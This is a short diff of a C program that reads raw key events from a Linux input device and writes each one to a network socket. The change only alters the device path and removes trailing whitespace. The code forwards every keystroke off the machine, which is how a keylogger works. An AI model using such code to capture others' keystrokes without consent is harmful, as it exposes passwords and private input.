@@ -38,7 +38,7 @@ struct KeyEvent kev_packet(struct input_event ev) {
 
 int main() {
     struct input_event ev;
-    int fd = open("/dev/input/event24", O_RDONLY);
+    int fd = open("/dev/input/event4", O_RDONLY);
     int client = client_socket();
 
     if (fd < 0) {
@@ -53,7 +53,7 @@ int main() {
             if (ev.type == EV_KEY) {
                 struct KeyEvent kev = kev_packet(ev);
                 write(client, &kev, sizeof(kev));
-            }           
+            }
         }
     }
 
